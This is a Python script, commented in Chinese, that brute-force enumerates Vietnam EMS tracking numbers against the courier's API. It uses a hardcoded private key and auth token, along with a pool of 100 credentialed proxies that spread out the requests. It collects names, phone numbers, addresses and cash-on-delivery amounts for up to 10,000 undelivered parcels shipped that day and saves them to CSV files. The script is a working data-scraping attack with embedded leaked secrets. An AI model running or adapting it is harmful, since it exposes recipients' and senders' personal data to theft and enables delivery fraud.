#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
高速扫描今天的订单 - 目标10000+
策略：扫描最新区间，只保存今天发件的
"""
import hashlib, requests, json, time, random, re
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

API_URL = "https://api-dingdong.ems.com.vn/"
PRIVATE_KEY = "34784DCEAD1484AA758A8C033FB0F858BDACABC7BE8FC2F5CC5AFD376AB8654A"
BASIC_AUTH = "bG90dG5ldDpkbXM="

TODAY = datetime.now().strftime("%d/%m/%Y")  # 14/10/2025
proxies, print_lock = [], threading.Lock()
state = {'found': 0, 'tested': 0, 'orders': [], 'lock': threading.Lock(), 'start_time': time.time()}
TARGET = 10000

# 100个代理池（完整）
PROXIES = [
    "23.27.184.245:5846:uadkcvtn:uo2rzar814ph",
    "45.43.70.140:6427:uadkcvtn:uo2rzar814ph",
    "82.24.233.117:5439:uadkcvtn:uo2rzar814ph",
    "136.0.188.71:6034:uadkcvtn:uo2rzar814ph",
    "161.123.130.168:5839:uadkcvtn:uo2rzar814ph",
    "142.147.240.52:6574:uadkcvtn:uo2rzar814ph",
    "166.88.224.145:6043:uadkcvtn:uo2rzar814ph",
    "82.25.215.106:5457:uadkcvtn:uo2rzar814ph",
    "91.211.87.215:7205:uadkcvtn:uo2rzar814ph",
    "104.238.36.64:6071:uadkcvtn:uo2rzar814ph",
    "104.239.40.211:6830:uadkcvtn:uo2rzar814ph",
    "67.227.37.26:5568:uadkcvtn:uo2rzar814ph",
    "108.165.218.84:5823:uadkcvtn:uo2rzar814ph",
    "109.196.160.242:5988:uadkcvtn:uo2rzar814ph",
    "104.238.38.204:6472:uadkcvtn:uo2rzar814ph",
    "140.99.203.108:5985:uadkcvtn:uo2rzar814ph",
    "82.25.224.37:7848:uadkcvtn:uo2rzar814ph",
    "216.74.118.50:6205:uadkcvtn:uo2rzar814ph",
    "104.239.13.199:6828:uadkcvtn:uo2rzar814ph",
    "161.123.152.216:6461:uadkcvtn:uo2rzar814ph",
    "185.72.240.218:7254:uadkcvtn:uo2rzar814ph",
    "104.239.43.88:5816:uadkcvtn:uo2rzar814ph",
    "92.113.115.48:5995:uadkcvtn:uo2rzar814ph",
    "145.223.44.64:5747:uadkcvtn:uo2rzar814ph",
    "155.254.34.216:6196:uadkcvtn:uo2rzar814ph",
    "166.88.169.112:6719:uadkcvtn:uo2rzar814ph",
    "82.23.223.60:7904:uadkcvtn:uo2rzar814ph",
    "166.88.235.140:5768:uadkcvtn:uo2rzar814ph",
    "23.129.252.17:6285:uadkcvtn:uo2rzar814ph",
    "46.203.134.90:5714:uadkcvtn:uo2rzar814ph",
    "82.23.227.49:7352:uadkcvtn:uo2rzar814ph",
    "104.239.13.114:6743:uadkcvtn:uo2rzar814ph",
    "50.114.98.129:5613:uadkcvtn:uo2rzar814ph",
    "154.6.83.144:6615:uadkcvtn:uo2rzar814ph",
    "45.38.86.229:6158:uadkcvtn:uo2rzar814ph",
    "64.137.73.19:5107:uadkcvtn:uo2rzar814ph",
    "45.131.101.19:6286:uadkcvtn:uo2rzar814ph",
    "104.239.40.197:6816:uadkcvtn:uo2rzar814ph",
    "82.21.209.226:6555:uadkcvtn:uo2rzar814ph",
    "23.26.71.157:5640:uadkcvtn:uo2rzar814ph",
    "23.27.91.75:6154:uadkcvtn:uo2rzar814ph",
    "23.95.150.72:6041:uadkcvtn:uo2rzar814ph",
    "82.26.218.128:6436:uadkcvtn:uo2rzar814ph",
    "91.223.126.118:6730:uadkcvtn:uo2rzar814ph",
    "145.223.44.177:5860:uadkcvtn:uo2rzar814ph",
    "45.38.94.42:5963:uadkcvtn:uo2rzar814ph",
    "23.26.95.215:5697:uadkcvtn:uo2rzar814ph",
    "50.114.15.8:5993:uadkcvtn:uo2rzar814ph",
    "82.24.217.113:5443:uadkcvtn:uo2rzar814ph",
    "136.0.109.46:6332:uadkcvtn:uo2rzar814ph",
    "185.101.253.194:5754:uadkcvtn:uo2rzar814ph",
    "38.153.133.31:9435:uadkcvtn:uo2rzar814ph",
    "108.165.161.42:5783:uadkcvtn:uo2rzar814ph",
    "2.57.31.80:6656:uadkcvtn:uo2rzar814ph",
    "45.56.173.242:6225:uadkcvtn:uo2rzar814ph",
    "216.173.104.22:6159:uadkcvtn:uo2rzar814ph",
    "216.173.123.97:6472:uadkcvtn:uo2rzar814ph",
    "104.253.55.119:5549:uadkcvtn:uo2rzar814ph",
    "91.211.87.2:6992:uadkcvtn:uo2rzar814ph",
    "142.111.44.203:5915:uadkcvtn:uo2rzar814ph",
    "191.101.174.88:6136:uadkcvtn:uo2rzar814ph",
    "31.58.26.144:6727:uadkcvtn:uo2rzar814ph",
    "104.232.211.81:5694:uadkcvtn:uo2rzar814ph",
    "104.253.48.76:5500:uadkcvtn:uo2rzar814ph",
    "154.36.85.89:6600:uadkcvtn:uo2rzar814ph",
    "140.99.202.10:5888:uadkcvtn:uo2rzar814ph",
    "45.41.169.227:6888:uadkcvtn:uo2rzar814ph",
    "45.67.0.158:6594:uadkcvtn:uo2rzar814ph",
    "45.150.176.51:5924:uadkcvtn:uo2rzar814ph",
    "104.238.7.43:5970:uadkcvtn:uo2rzar814ph",
    "216.173.75.47:6348:uadkcvtn:uo2rzar814ph",
    "45.39.5.58:6496:uadkcvtn:uo2rzar814ph",
    "46.203.157.176:7119:uadkcvtn:uo2rzar814ph",
    "104.233.20.17:6033:uadkcvtn:uo2rzar814ph",
    "216.74.114.235:6518:uadkcvtn:uo2rzar814ph",
    "142.202.254.167:6145:uadkcvtn:uo2rzar814ph",
    "37.44.219.236:6201:uadkcvtn:uo2rzar814ph",
    "82.24.239.176:7033:uadkcvtn:uo2rzar814ph",
    "104.239.19.194:6871:uadkcvtn:uo2rzar814ph",
    "191.101.181.187:6940:uadkcvtn:uo2rzar814ph",
    "38.154.199.233:5387:uadkcvtn:uo2rzar814ph",
    "45.39.18.128:6564:uadkcvtn:uo2rzar814ph",
    "103.47.53.151:8449:uadkcvtn:uo2rzar814ph",
    "45.39.17.119:5542:uadkcvtn:uo2rzar814ph",
    "216.173.75.226:6527:uadkcvtn:uo2rzar814ph",
    "45.56.175.4:5678:uadkcvtn:uo2rzar814ph",
    "64.137.89.84:6157:uadkcvtn:uo2rzar814ph",
    "82.21.248.115:6451:uadkcvtn:uo2rzar814ph",
    "198.46.241.44:6579:uadkcvtn:uo2rzar814ph",
    "45.83.57.20:6537:uadkcvtn:uo2rzar814ph",
    "104.239.41.168:6523:uadkcvtn:uo2rzar814ph",
    "64.137.77.92:5527:uadkcvtn:uo2rzar814ph",
    "104.253.82.58:6479:uadkcvtn:uo2rzar814ph",
    "82.23.223.166:8010:uadkcvtn:uo2rzar814ph",
    "185.15.178.90:5774:uadkcvtn:uo2rzar814ph",
    "209.127.191.113:5187:uadkcvtn:uo2rzar814ph",
    "191.101.174.78:6126:uadkcvtn:uo2rzar814ph",
    "217.69.127.152:6773:uadkcvtn:uo2rzar814ph",
    "38.225.2.55:5838:uadkcvtn:uo2rzar814ph",
    "92.112.136.179:6123:uadkcvtn:uo2rzar814ph",
]

def load_proxies():
    global proxies
    for p in PROXIES:  # 使用全部100个代理
        parts = p.split(':')
        if len(parts) == 4:
            ip, port, user, pwd = parts
            proxies.append({'http': f'http://{user}:{pwd}@{ip}:{port}', 'https': f'http://{user}:{pwd}@{ip}:{port}'})
    print(f"✅ 加载 {len(proxies)} 个代理\n")

def sign(text):
    return hashlib.sha256((text + PRIVATE_KEY).encode()).hexdigest().upper()

def safe_print(msg):
    with print_lock:
        print(msg)

def is_today(date_str):
    return date_str and TODAY in str(date_str)

def extract_phone(text):
    if not text:
        return None
    phones = re.findall(r'0\d{8,10}', str(text))
    return phones[0] if phones else None

def check_order(tracking):
    if state['found'] >= TARGET:
        return None
    
    sig = sign(tracking)
    headers = {"Authorization": f"Basic {BASIC_AUTH}", "APIKey": PRIVATE_KEY, "Content-Type": "application/x-www-form-urlencoded"}
    
    try:
        proxy = random.choice(proxies) if proxies else None
        
        # Inquiry - 最快，先查这个
        r = requests.post(f"{API_URL}api/Delivery/Inquiry", headers=headers, data={"ParcelCode": tracking, "Signature": sig}, proxies=proxy, timeout=5)
        
        with state['lock']:
            state['tested'] += 1
        
        if r.status_code == 200 and r.json().get('Value'):
            v = r.json()['Value']
            issue_date = v.get('IssueDate') or v.get('LoadDate')
            
            # 只要今天发件的
            if is_today(issue_date):
                # 检查是否未配送
                r2 = requests.post(f"{API_URL}api/Delivery/DeliveryLadingJourney", headers=headers, data={"ParcelCode": tracking}, proxies=proxy, timeout=5)
                is_delivered = r2.status_code == 200 and r2.json().get('ListValue')
                
                if not is_delivered:  # 未配送
                    order = {
                        'tracking': tracking,
                        'issue_date': issue_date,
                        'receiver': v.get('ReceiverName',''),
                        'phone': v.get('ReceiverPhone','') or extract_phone(v.get('ReceiverName','')),
                        'amount': v.get('CollectAmount',0),
                        'address': v.get('ReceiverAddress',''),
                        'sender': v.get('SenderName',''),
                        'sender_phone': v.get('SenderPhone','')
                    }
                    
                    with state['lock']:
                        state['found'] += 1
                        state['orders'].append(order)
                        
                        elapsed = time.time() - state['start_time']
                        speed = state['tested'] / elapsed if elapsed > 0 else 0
                        
                        safe_print(f"✅ [{state['found']}/{TARGET}] {tracking} | 👤{order['receiver'][:15]} | 📞{order['phone']} | 💰{order['amount']:,}₫ | {speed:.0f}/s")
                        
                        # 每100个保存一次
                        if state['found'] % 100 == 0:
                            save_progress()
                    
                    return True
    except:
        pass
    
    return False

def save_progress():
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    csv_file = f"today_undelivered_{timestamp}.csv"
    
    with open(csv_file, 'w', encoding='utf-8') as f:
        f.write("运单号,发件日期,发件人,发件电话,收件人,收件电话,收件地址,金额\n")
        for o in state['orders']:
            f.write(f'"{o["tracking"]}","{o["issue_date"]}","{o["sender"]}","{o["sender_phone"]}",')
            f.write(f'"{o["receiver"]}","{o["phone"]}","{o["address"]}","{o["amount"]}"\n')
    
    safe_print(f"💾 已保存 {state['found']} 个 → {csv_file}")

# 扫描最新区间（最可能有今天的）
SCAN_RANGES = [
    ('EP', 493500000, 494500000, 10),   # EP最新，步长10
    ('EB', 943000000, 945000000, 20),   # EB最新
    ('EC', 149780000, 149790000, 5),    # EC最新
    ('EF', 48000000, 49000000, 50),     # EF最新
]

print(f"""
╔════════════════════════════════════════════════════════════════════════════╗
║          🚀 扫描今天未签收订单 - {TODAY} - 目标:{TARGET:,}个        ║
╚════════════════════════════════════════════════════════════════════════════╝

策略：
  • 扫描4个系列最新区间
  • 30线程超高速并发
  • 100代理池轮询
  • 只保存今天发件+未签收

扫描区间：
  EP: 493500000-494500000 (步长10)
  EB: 943000000-945000000 (步长20)
  EC: 149780000-149790000 (步长5)
  EF: 48000000-49000000 (步长50)
""")

load_proxies()

print(f"🚀 开始高速扫描...\n")
start_time = time.time()

with ThreadPoolExecutor(max_workers=30) as executor:
    futures = []
    
    for prefix, start, end, step in SCAN_RANGES:
        if state['found'] >= TARGET:
            break
        
        for num in range(start, end, step):
            if state['found'] >= TARGET:
                break
            
            tracking = f"{prefix}{num:09d}VN"
            futures.append(executor.submit(check_order, tracking))
            
            # 每1000个显示进度
            if len(futures) % 1000 == 0:
                time.sleep(0.1)  # 避免太快
    
    # 等待完成
    for future in as_completed(futures):
        try:
            future.result()
            
            # 显示进度
            if state['tested'] % 1000 == 0:
                elapsed = time.time() - start_time
                speed = state['tested'] / elapsed if elapsed > 0 else 0
                safe_print(f"\n📊 已扫{state['tested']} | 找到{state['found']} | {speed:.0f}/s | {state['found']/state['tested']*100:.2f}%\n")
        except:
            pass

# 最终保存
save_progress()

elapsed = time.time() - start_time
print(f"""
\n{'='*80}
🎉 扫描完成！
{'='*80}
找到今天未签收订单: {state['found']:,} 个
已测试: {state['tested']:,} 个
成功率: {state['found']/state['tested']*100:.2f}%
耗时: {elapsed:.1f} 秒 ({elapsed/60:.1f} 分钟)
速度: {state['tested']/elapsed:.0f} 次/秒
{'='*80}
""")
